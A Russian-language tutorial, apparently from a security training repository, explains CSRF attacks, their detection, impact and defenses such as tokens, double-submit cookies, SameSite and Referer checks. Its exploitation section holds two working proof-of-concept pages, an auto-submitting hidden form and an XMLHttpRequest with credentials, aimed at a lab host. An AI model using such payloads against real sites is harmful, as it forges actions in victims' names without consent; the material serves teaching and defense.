# CSRF атака

## Описание

CSRF - это атака при которой атакующий выполняет массу различных действий от имени других зарегистрированных посетителей. Для управления сессией пользователя многие веб-приложения используют cookie. Основная проблема в том, что, если у бразуера есть куки пользователя для данного домена и пути, он их автоматически отправляет вместе с HTTP-запросом.

Атаки по подделке межсайтовых запросов (CSRF) работает следующим образом:
1) Вредоносный код обычно размещается на веб-сайте принадлежащим злоумышленнику. При загрузке страницы злоумышленника отправляется запрос на уязвимое веб-приложение 
2) Этот запрос отправляется автоматически: JavaScript вызывает `form.submit` или использует `XMLHttpRequest`. При этом, браузер прикладывает к запросу учетные данные HTTP или файлы cookie. Для уязвимого веб-приложения этот запрос будет выглядеть как легитимный запрос от аутентифицированного пользователя.

## Классификация
#### CSRF-атака с использованием запроса GET
Если действие происходит через GET-запрос, то эксплуатация не составляет труда. Необходимо приложить на сайте атакующего вызов этого GET-запроса. Это можно сделать через `form` или через тег для картинок - `img`. При переходе на сайт атакующего - запрос автоматически отправится, при этом браузер приложит cookie. Помимо этого, можно просто передать ссылку на уязвимый метод пользователю. При переходе по ссылке - действие выполнится.

#### CSRF-атаки с использованием запросов POST
Большинство запросов на выполнение действия будут осуществлятся через запросы POST, отправляющие любые параметры и значения в теле запроса. 
Для запросов POST требуется, чтобы тело запроса было добавлено к самому запросу. Используя JavaScript, злоумышленник может написать свое вредоносное веб-приложение так, чтобы при загрузке веб-страницы незаконный запрос POST отправлялся автоматически.
При загрузке страницы, заготовленная функция обеспечивает отправку формы, которая в свою очередь отправляет запрос POST. В форму включены статические параметры, где, уязвимый сайт примет запрос как легитимный, поскольку он будет включать файлы cookie пользователя.
Помимо этого, для формирования запроса можно использовать `XMLHttpRequest`, который используется в своременных браузерах.

## Условия
- ОС: любая
- язык: любой
- компоненты: не имеют значения
- настройки: для управления сессиями используются cookie

## Детектирование
Проблема детектируется в ручную. 
Необходимо проверить:
1) Используется ли для управления сессией cookies.
2) наличие CSRF токена в заголовках, в cookies или в параметрах при отправке запроса.
3) заголовок Referer

После этого попытаться убрать защитные механизмы (CSRF-токены или заголовок Referer) и понять, как реагирует приложение на это.

## Эксплуатация

![Иллюстрация к проекту](https://github.com/kythip/shift2019/blob/master/csrf/Снимок.PNG)

На рисунке 1 показаны оригинальная страница и видоизмененный запрос, изменяющий параметр `settings` с `true` на `false`.




![Иллюстрация к проекту](https://github.com/kythip/shift2019/blob/master/csrf/Снимок1.PNG)

На рисунке 2 показан результат перехода по ссылке, показанной на рисунке 1. Как видно на рисунке 2 – пользователем, в браузере которого были сохранены cookie и, следовательно, он был залогинен на данном сайте, был отправлен запрос против его воли. 



![Иллюстрация к проекту](https://github.com/kythip/shift2019/blob/master/csrf/Снимок2.PNG)


На рисунке 3 показан состав пакета, с помощью которого составили вредоносную ссылку. Во второй строке показан изначальный хост - адрес сервера, с которого и с которым проводятся манипуляции. В первой строке указан метод, команда и изменяемая переменная.


```html
<!DOCTYPE html> 
  <html lang="en"> 
  <head> 
    <meta charset="UTF-8"> 
    <title>CSRF</title> 
  </head> 
  <body> 
 
  <br> 
  <p> 
    <form name="csrf_try" action="http://192.168.99.100:1337/change_settings_2" method="POST"> 
      <p><input type=hidden value="false" name=settings> 
  </form> 
  </p> 
    <script type="text/javascript"> 
    document.csrf_try.submit(); 
  </script>  
  </body> 
  </html>
```
Данный код представляет HTML-страницу, на который присутсвует вредоносный код. В form указывается имя формы, метод и "действие". В данном случае, переход на страницу изменения параметра. В строке `input` указывается атрибут `hidden`, который скрывает от пользователя изменения параметра на `false`. После формы идет код javascript, который выполняет автоматическую отправку формы при открытии страницы.
Теперь, если залогиненный пользователь на ресурсе `192.168.99.100`, перейдет на данную страницу, то у него изменится параметр `settings` на `false`.
  


```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>XHR_CSRF</title>
</head>
<body>

	<script	type="text/javascript">
var xhr=new XMLHttpRequest ();
xhr.open("POST", "http://192.168.99.100:1337/change_settings_2", true);
xhr.setRequestHeader("Accept", "text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8");
xhr.setRequestHeader("Accept-Language", "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3");
 
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.withCredentials=true;
var params='settings=false';
xhr.send(params);
	</script>
</body>
</html>
```

С использованием `XMLHttpRequest` возможно совершить действие асинхронно - без перехода пользователя на атакуемую страницу. 

## Ущерб
Злоумышленник имеет возможность совершать действия от любого пользователя на уязвимом сайте.

Такими действиями могут быть:
1) Смена пароля с последующей кражей аккаунта
2) Подписка на какую-либо страницу или сервис
3) Отправить сообщение или письмо.
4) Перевод денег.
5) Шантажирование пользователя методами социальной инженирии.
6) И другие действия, которые позволяет выполнять конкретное веб-приложение.

## Защита
### Основные меры

1) GET-запросы в веб-приложении вообще не должны выполнять каких-либо действий
2) CSRF токен
* генерируется рандомный токен, который привязывается к сессии
* сервер подставляет токен в HTML-форму и сверяет с сохраненным при приеме запроса
* атакующий не знает токена, следовательно не сможет заставить пользователя валидный запрос
* токен хранится в базе данных (statefull метод)
* для формирования токена необходимо использовать идентификатор пользователя и timestamp. Иначе, в первом случае, cookie одного пользователя может быть использован другим пользователем. Во втором случае, для ограничения времени жизни токена для защиты от использования токена в случае его копроментации.

3) Double Submit Cookie 
* сервер передает токен пользователю в cookie; 
* токен вставляется в заголовок на стороне пользователя с помощью javascript при запросе на сервер;
* в последующих запросах сервер получает оба токена (в cookie и в header);
* сервер обязан проверить на идентичность токен из cookie и токен, который прислал клиент в заголовке. Если оба токена совпадают, то запрос не подвергся CSRF-Атаке, в ином случае — логируем событие и отклоняем запрос

4) SameSite Cookies (Chrome, Opera)
* cookie не нужно передавать, если запрос идет с сайта, отличного от того, на котором cookie была установлена (защита ресурса от CSRF без использования дополнительных инструментов)
* SameSite - это флаг для cookie
* SameSite может иметь одно из двух значений:
  * Strict
  * Lax
* Не все браузеры сейчас поддерживает эту возможность

5) Content-Type based protection
* пользователь должен отправить запрос с определенным заголовком Content-Type, например, application/json; 
* защиту можно обойти с использованием flash и 307 redirect. Пример [тут](https://blog.appsecco.com/exploiting-csrf-on-json-endpoints-with-flash-and-redirects-681d4ad6b31b)

6) Referer-based protection
* пользователь должен отправить запрос с определенным значением заголовка Referer
* бэкенд его проверяет, если он неверный, то считается, что это CSRF-атака
* нужно учитывать логику при построении сервера. Refer может быть пустым и сервер не будет знать что ему делать с запросом: отклонять его или пропускать.

7) Password confirmation / websudo
* пользователь должен подтверждать действие с помощью пароля (или секрета)
* атакующий его не знает, поэтому классическая CSRF-атака не работает


## Обход защиты

